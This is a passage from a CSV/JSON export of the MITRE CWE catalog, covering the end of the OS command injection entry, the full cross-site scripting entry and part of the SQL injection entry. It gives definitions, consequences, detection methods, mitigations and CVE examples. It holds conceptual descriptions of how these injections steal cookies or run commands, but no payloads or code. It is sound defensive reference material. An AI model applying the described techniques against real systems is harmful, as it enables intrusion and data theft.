depth.:EFFECTIVENESS:Moderate::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::\",\"::REFERENCE:CVE-2020-10987:DESCRIPTION:OS command injection in Wi-Fi router, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-10987::REFERENCE:CVE-2020-10221:DESCRIPTION:Template functionality in network configuration management tool allows OS command injection, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-10221::REFERENCE:CVE-2020-9054:DESCRIPTION:Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-9054::REFERENCE:CVE-1999-0067:DESCRIPTION:Canonical example of OS command injection. CGI program does not neutralize | metacharacter when invoking a phonebook program.:LINK:https://www.cve.org/CVERecord?id=CVE-1999-0067::REFERENCE:CVE-2001-1246:DESCRIPTION:Language interpreter's mail function accepts another argument that is concatenated to a string used in a dangerous popen() call. Since there is no neutralization of this argument, both OS Command Injection (CWE-78) and Argument Injection (CWE-88) are possible.:LINK:https://www.cve.org/CVERecord?id=CVE-2001-1246::REFERENCE:CVE-2002-0061:DESCRIPTION:Web server allows command execution using | (pipe) character.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-0061::REFERENCE:CVE-2003-0041:DESCRIPTION:FTP client does not filter | from filenames returned by the server, allowing for OS command injection.:LINK:https://www.cve.org/CVERecord?id=CVE-2003-0041::REFERENCE:CVE-2008-2575:DESCRIPTION:Shell metacharacters in a filename in a ZIP archive:LINK:https://www.cve.org/CVERecord?id=CVE-2008-2575::REFERENCE:CVE-2002-1898:DESCRIPTION:Shell metacharacters in a telnet:// link are not properly handled when the launching application processes the link.:LINK:https://www.cve.org/CVERecord?id=CVE-2002-1898::REFERENCE:CVE-2008-4304:DESCRIPTION:OS command injection through environment variable.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4304::REFERENCE:CVE-2008-4796:DESCRIPTION:OS command injection through https:// URLs:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4796::REFERENCE:CVE-2007-3572:DESCRIPTION:Chain: incomplete denylist for OS command injection:LINK:https://www.cve.org/CVERecord?id=CVE-2007-3572::REFERENCE:CVE-2012-1988:DESCRIPTION:Product allows remote users to execute arbitrary commands by creating a file whose pathname contains shell metacharacters.:LINK:https://www.cve.org/CVERecord?id=CVE-2012-1988::\",::Program Invocation::,::System Process::,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:OS Command Injection::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A3:ENTRY NAME:Malicious File Execution:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A6:ENTRY NAME:Injection Flaws:MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ENV03-C:ENTRY NAME:Sanitize the environment when invoking external programs::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:ENV33-C:ENTRY NAME:Do not call system():MAPPING FIT:CWE More Specific::TAXONOMY NAME:CERT C Secure Coding:ENTRY ID:STR02-C:ENTRY NAME:Sanitize data passed to complex subsystems::TAXONOMY NAME:WASC:ENTRY ID:31:ENTRY NAME:OS Commanding::TAXONOMY NAME:The CERT Oracle Secure Coding Standard for Java (2011):ENTRY ID:IDS07-J:ENTRY NAME:Do not pass untrusted, unsanitized data to the Runtime.exec() method::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-78::\",::108::15::43::6::88::,\"::TYPE:Terminology:NOTE:The OS command injection phrase carries different meanings to different people. For some people, it only refers to cases in which the attacker injects command separators into arguments for an application-controlled program that is being invoked. For some people, it refers to any type of attack that can allow the attacker to execute OS commands of their own choosing. This usage could include untrusted search path weaknesses (CWE-426) that cause the application to find and execute an attacker-controlled program. Further complicating the issue is the case when argument injection (CWE-88) allows alternate command-line switches or options to be inserted into the command line, such as an -exec switch whose purpose may be to execute the subsequent argument as a command (this -exec switch exists in the UNIX find command, for example). In this latter case, however, CWE-88 could be regarded as the primary weakness in a chain with CWE-78.::TYPE:Research Gap:NOTE:More investigation is needed into the distinction between the OS command injection variants, including the role with argument injection (CWE-88). Equivalent distinctions may exist in other injection-related problems such as SQL injection.::\",\n79,\"Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\",Base,Stable,\"The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.\",\"Cross-site scripting (XSS) vulnerabilities occur when: Untrusted data enters a web application, typically from a web request. The web application dynamically generates a web page that contains this untrusted data. During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc. A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data. Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain. This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain. There are three main kinds of XSS: Type 1: Reflected XSS (or Non-Persistent) - The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser. Type 2: Stored XSS (or Persistent) - The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs. Type 0: DOM-Based XSS - In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible. Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as drive-by hacking. In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious.\",::NATURE:ChildOf:CWE ID:74:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::NATURE:CanPrecede:CWE ID:494:VIEW ID:1000::NATURE:PeerOf:CWE ID:352:VIEW ID:1000::,\"::ORDINALITY:Resultant::\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY CLASS:Web Based:TECHNOLOGY PREVALENCE:Often::,\"::The Same Origin Policy states that browsers should limit the resources accessible to scripts running on a given web site, or origin, to the resources associated with that web site on the client-side, and not the client-side resources of any other sites or origins. The goal is to prevent one site from being able to modify or read the contents of an unrelated site. Since the World Wide Web involves interactions between many sites, this policy is important for browsers to enforce. When referring to XSS, the Domain of a website is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the user's interactions with this particular site.::\",\"::TERM:XSS:DESCRIPTION:A common abbreviation for Cross-Site Scripting.::TERM:HTML Injection:DESCRIPTION:Used as a synonym of stored (Type 2) XSS.::TERM:CSS:DESCRIPTION:In the early years after initial discovery of XSS, CSS was a commonly-used acronym. However, this would cause confusion with Cascading Style Sheets, so usage of this acronym has declined significantly.::\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::\",\"\",,\"::SCOPE:Access Control:SCOPE:Confidentiality:IMPACT:Bypass Protection Mechanism:IMPACT:Read Application Data:NOTE:The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.::SCOPE:Integrity:SCOPE:Confidentiality:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:SCOPE:Access Control:IMPACT:Execute Unauthorized Code or Commands:IMPACT:Bypass Protection Mechanism:IMPACT:Read Application Data:NOTE:The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running Active X controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible, especially when multiple components are involved.:EFFECTIVENESS:Moderate::METHOD:Black Box:DESCRIPTION:Use the XSS Cheat Sheet [REF-714] or automated test-generation tools to help launch a wide variety of attacks against your web application. The Cheat Sheet contains many subtle XSS variations that are specifically targeted against weak XSS defenses.:EFFECTIVENESS:Moderate::\",\"::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.::PHASE:Implementation Architecture and Design:DESCRIPTION:Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies. For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters. Parts of the same output document may require different encodings, which will vary depending on whether the output is in the: HTML body Element attributes (such as src=XYZ) URIs JavaScript sections Cascading Style Sheets and style property etc. Note that HTML Entity Encoding is only appropriate for the HTML body. Consult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed.::PHASE:Architecture and Design Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.:EFFECTIVENESS:Limited::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Architecture and Design:STRATEGY:Parameterization:DESCRIPTION:If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component. The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.::PHASE:Implementation:DESCRIPTION:With Struts, write all data from form beans with the bean's filter attribute set to true.::PHASE:Implementation:STRATEGY:Attack Surface Reduction:DESCRIPTION:To help mitigate XSS attacks against the user's session cookie, set the session cookie to be HttpOnly. In browsers that support the HttpOnly feature (such as more recent versions of Internet Explorer and Firefox), this attribute can prevent the user's session cookie from being accessible to malicious client-side scripts that use document.cookie. This is not a complete solution, since HttpOnly is not supported by all browsers. More importantly, XMLHTTPRequest and other powerful browser technologies provide read access to HTTP headers, including the Set-Cookie header in which the HttpOnly flag is set.:EFFECTIVENESS:Defense in Depth::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When dynamically constructing web pages, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. All input should be validated and cleansed, not just parameters that the user is supposed to specify, but all data in the request, including hidden fields, cookies, headers, the URL itself, and so forth. A common mistake that leads to continuing XSS vulnerabilities is to validate only fields that are expected to be redisplayed by the site. It is common to see data from the request that is reflected by the application server or the application that the development team did not anticipate. Also, a field that is not currently reflected may be used by a future developer. Therefore, validating ALL parts of the HTTP request is recommended. Note that proper output encoding, escaping, and quoting is the most effective solution for preventing XSS, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent XSS, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, in a chat application, the heart emoticon (<3) would likely pass the validation step, since it is commonly used. However, it cannot be directly inserted into the web page because it contains the < character, which would need to be escaped or otherwise handled. In this case, stripping the < might reduce the risk of XSS, but it would produce incorrect behavior because the emoticon would not be recorded. This might seem to be a minor inconvenience, but it would be more important in a mathematical forum that wants to represent inequalities. Even if you make a mistake in your validation (such as forgetting one out of 100 input fields), appropriate encoding is still likely to protect you from injection-based attacks. As long as it is not done in isolation, input validation is still a useful technique, since it may significantly reduce your attack surface, allow you to detect some attacks, and provide other security benefits that proper encoding does not address. Ensure that you perform input validation at well-defined interfaces within the application. This will help protect the application even if a component is reused or moved elsewhere.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.::PHASE:Operation:STRATEGY:Firewall:DESCRIPTION:Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.:EFFECTIVENESS:Moderate::PHASE:Operation Implementation:STRATEGY:Environment Hardening:DESCRIPTION:When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.::\",\"::REFERENCE:CVE-2021-25926:DESCRIPTION:Python Library Manager did not sufficiently neutralize a user-supplied search term, allowing reflected XSS.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-25926::REFERENCE:CVE-2021-25963:DESCRIPTION:Python-based e-commerce platform did not escape returned content on error pages, allowing for reflected Cross-Site Scripting attacks.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-25963::REFERENCE:CVE-2021-1879:DESCRIPTION:Universal XSS in mobile operating system, as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2021-1879::REFERENCE:CVE-2020-3580:DESCRIPTION:Chain: improper input validation (CWE-20) in firewall product leads to XSS (CWE-79), as exploited in the wild per CISA KEV.:LINK:https://www.cve.org/CVERecord?id=CVE-2020-3580::REFERENCE:CVE-2014-8958:DESCRIPTION:Admin GUI allows XSS through cookie.:LINK:https://www.cve.org/CVERecord?id=CVE-2014-8958::REFERENCE:CVE-2017-9764:DESCRIPTION:Web stats program allows XSS through crafted HTTP header.:LINK:https://www.cve.org/CVERecord?id=CVE-2017-9764::REFERENCE:CVE-2014-5198:DESCRIPTION:Web log analysis product allows XSS through crafted HTTP Referer header.:LINK:https://www.cve.org/CVERecord?id=CVE-2014-5198::REFERENCE:CVE-2008-5080:DESCRIPTION:Chain: protection mechanism failure allows XSS:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5080::REFERENCE:CVE-2006-4308:DESCRIPTION:Chain: incomplete denylist (CWE-184) only checks javascript: tag, allowing XSS (CWE-79) using other tags:LINK:https://www.cve.org/CVERecord?id=CVE-2006-4308::REFERENCE:CVE-2007-5727:DESCRIPTION:Chain: incomplete denylist (CWE-184) only removes SCRIPT tags, enabling XSS (CWE-79):LINK:https://www.cve.org/CVERecord?id=CVE-2007-5727::REFERENCE:CVE-2008-5770:DESCRIPTION:Reflected XSS using the PATH_INFO in a URL:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5770::REFERENCE:CVE-2008-4730:DESCRIPTION:Reflected XSS not properly handled when generating an error message:LINK:https://www.cve.org/CVERecord?id=CVE-2008-4730::REFERENCE:CVE-2008-5734:DESCRIPTION:Reflected XSS sent through email message.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5734::REFERENCE:CVE-2008-0971:DESCRIPTION:Stored XSS in a security product.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-0971::REFERENCE:CVE-2008-5249:DESCRIPTION:Stored XSS using a wiki page.:LINK:https://www.cve.org/CVERecord?id=CVE-2008-5249::REFERENCE:CVE-2006-3568:DESCRIPTION:Stored XSS in a guestbook application.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-3568::REFERENCE:CVE-2006-3211:DESCRIPTION:Stored XSS in a guestbook application using a javascript: URI in a bbcode img tag.:LINK:https://www.cve.org/CVERecord?id=CVE-2006-3211::REFERENCE:CVE-2006-3295:DESCRIPTION:Chain: library file is not protected against a direct request (CWE-425), leading to reflected XSS (CWE-79).:LINK:https://www.cve.org/CVERecord?id=CVE-2006-3295::\",,,\"::TAXONOMY NAME:PLOVER:ENTRY NAME:Cross-site scripting (XSS)::TAXONOMY NAME:7 Pernicious Kingdoms:ENTRY NAME:Cross-site Scripting::TAXONOMY NAME:CLASP:ENTRY NAME:Cross-site scripting::TAXONOMY NAME:OWASP Top Ten 2007:ENTRY ID:A1:ENTRY NAME:Cross Site Scripting (XSS):MAPPING FIT:Exact::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A1:ENTRY NAME:Unvalidated Input:MAPPING FIT:CWE More Specific::TAXONOMY NAME:OWASP Top Ten 2004:ENTRY ID:A4:ENTRY NAME:Cross-Site Scripting (XSS) Flaws:MAPPING FIT:Exact::TAXONOMY NAME:WASC:ENTRY ID:8:ENTRY NAME:Cross-site Scripting::TAXONOMY NAME:Software Fault Patterns:ENTRY ID:SFP24:ENTRY NAME:Tainted input to command::TAXONOMY NAME:OMG ASCSM:ENTRY ID:ASCSM-CWE-79::\",::209::588::591::592::63::85::,\"::TYPE:Relationship:NOTE:There can be a close relationship between XSS and CSRF (CWE-352). An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload. A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend. MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.::TYPE:Applicable Platform:NOTE:XSS flaws are very common in web applications, since they require a great deal of developer discipline to avoid them.::\","
  },
  "doc-311c98c250203016370983a6ce8008ab": {
    "content": "CWE-ID,Name,Weakness Abstraction,Status,Description,Extended Description,Related Weaknesses,Weakness Ordinalities,Applicable Platforms,Background Details,Alternate Terms,Modes Of Introduction,Exploitation Factors,Likelihood of Exploit,Common Consequences,Detection Methods,Potential Mitigations,Observed Examples,Functional Areas,Affected Resources,Taxonomy Mappings,Related Attack Patterns,Notes\n89,\"Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\",Base,Stable,\"The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data.\",\"\",::NATURE:ChildOf:CWE ID:943:VIEW ID:1000:ORDINAL:Primary::NATURE:ChildOf:CWE ID:74:VIEW ID:1003:ORDINAL:Primary::,\"\",::LANGUAGE CLASS:Not Language-Specific:LANGUAGE PREVALENCE:Undetermined::TECHNOLOGY NAME:Database Server:TECHNOLOGY PREVALENCE:Undetermined::,\"\",\"::TERM:SQL injection:DESCRIPTION:a common attack-oriented phrase::TERM:SQLi:DESCRIPTION:a common abbreviation for SQL injection::\",\"::PHASE:Implementation:NOTE:REALIZATION: This weakness is caused during implementation of an architectural security tactic.::PHASE:Implementation:NOTE:This weakness typically appears in data-rich applications that save user inputs in a database.::\",\"\",,\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:IMPACT:Execute Unauthorized Code or Commands:NOTE:Adversaries could execute system commands, typically by changing the SQL statement to redirect output to a file that can then be executed.::SCOPE:Confidentiality:IMPACT:Read Application Data:NOTE:Since SQL databases generally hold sensitive data, loss of confidentiality is a frequent problem with SQL injection vulnerabilities.::SCOPE:Authentication:IMPACT:Gain Privileges or Assume Identity:IMPACT:Bypass Protection Mechanism:NOTE:If poor SQL commands are used to check user names and passwords or perform other kinds of authentication, it may be possible to connect to the product as another user with no previous knowledge of the password.::SCOPE:Access Control:IMPACT:Bypass Protection Mechanism:NOTE:If authorization information is held in a SQL database, it may be possible to change this information through the successful exploitation of a SQL injection vulnerability.::SCOPE:Integrity:IMPACT:Modify Application Data:NOTE:Just as it may be possible to read sensitive information, it is also possible to modify or even delete this information with a SQL injection attack.::\",\"::METHOD:Automated Static Analysis:DESCRIPTION:This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives. Automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or do not require any code changes. Automated static analysis might not be able to detect the usage of custom API functions or third-party libraries that indirectly invoke SQL commands, leading to false negatives - especially if the API/library code is not available for analysis.::METHOD:Automated Dynamic Analysis:DESCRIPTION:This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.:EFFECTIVENESS:Moderate::METHOD:Manual Analysis:DESCRIPTION:Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.::METHOD:Automated Static Analysis - Binary or Bytecode:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Bytecode Weakness Analysis - including disassembler + source code weakness analysis Binary Weakness Analysis - including disassembler + source code weakness analysis:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Automated Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Database Scanners Cost effective for partial coverage: Web Application Scanner Web Services Scanner:EFFECTIVENESS:High::METHOD:Dynamic Analysis with Manual Results Interpretation:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Cost effective for partial coverage: Fuzz Tester Framework-based Fuzzer:EFFECTIVENESS:SOAR Partial::METHOD:Manual Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Manual Source Code Review (not inspections) Cost effective for partial coverage: Focused Manual Spotcheck - Focused manual analysis of source:EFFECTIVENESS:High::METHOD:Automated Static Analysis - Source Code:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Source code Weakness Analyzer Context-configured Source Code Weakness Analyzer:EFFECTIVENESS:High::METHOD:Architecture or Design Review:DESCRIPTION:According to SOAR, the following detection techniques may be useful: Highly cost effective: Formal Methods / Correct-By-Construction Cost effective for partial coverage: Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.):EFFECTIVENESS:High::\",\"::PHASE:Architecture and Design:STRATEGY:Libraries or Frameworks:DESCRIPTION:Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid. For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.::PHASE:Architecture and Design:STRATEGY:Parameterization:DESCRIPTION:If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated. Process SQL queries using prepared statements, parameterized queries, or stored procedures. These features should accept parameters or variables and support strong typing. Do not dynamically construct and execute query strings within these features using exec or similar functionality, since this may re-introduce the possibility of SQL injection. [REF-867]::PHASE:Architecture and Design Operation:STRATEGY:Environment Hardening:DESCRIPTION:Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations. Specifically, follow the principle of least privilege when creating user accounts to a SQL database. The database users should only have the minimum privileges necessary to use their account. If the requirements of the system indicate that a user can read and modify their own data, then limit their privileges so they cannot read/write others' data. Use the strictest permissions possible on all database objects, such as execute-only for stored procedures.::PHASE:Architecture and Design:DESCRIPTION:For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.::PHASE:Implementation:STRATEGY:Output Encoding:DESCRIPTION:While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88). Instead of building a new implementation, such features may be available in the database or programming language. For example, the Oracle DBMS_ASSERT package can check or enforce that parameters have certain properties that make them less vulnerable to SQL injection. For MySQL, the mysql_real_escape_string() API function is available in both C and PHP.::PHASE:Implementation:STRATEGY:Input Validation:DESCRIPTION:Assume all input is malicious. Use an accept known good input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, boat may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as red or blue. Do not rely exclusively on looking for malicious or malformed inputs. This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright. When constructing SQL query strings, use stringent allowlists that limit the character set based on the expected value of the parameter in the request. This will indirectly limit the scope of an attack, but this technique is less important than proper output encoding and escaping. Note that proper output encoding, escaping, and quoting is the most effective solution for preventing SQL injection, although input validation may provide some defense-in-depth. This is because it effectively limits what will appear in output. Input validation will not always prevent SQL injection, especially if you are required to support free-form text fields that could contain arbitrary characters. For example, the name O'Reilly would likely pass the validation step, since it is a common last name in the English language. However, it cannot be directly inserted into the database because it contains the ' apostrophe character, which would need to be escaped or otherwise handled. In this case, stripping the apostrophe might reduce the risk of SQL injection, but it would produce incorrect behavior because the wrong name would be recorded. When feasible, it may be safest to disallow meta-characters entirely, instead of escaping them. This will provide some defense in depth. After the data is entered into the database, later processes may neglect to escape meta-characters before use, and you may not have control over those processes.::PHASE:Architecture and Design:STRATEGY:Enforcement by Conversion:DESCRIPTION:When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.::PHASE:Implementation:DESCRIPTION:Ensure that error messages only contain minimal details that are useful to the intended audience and no one else. The messages need to strike the balance between being too cryptic (which can confuse users) or being too detailed (which may reveal more than intended). The messages should not reveal the methods that were used to determine the error. Attackers can use detailed information to refine or optimize their original attack, thereby increasing their chances of success. If errors must be captured in some detail, record them 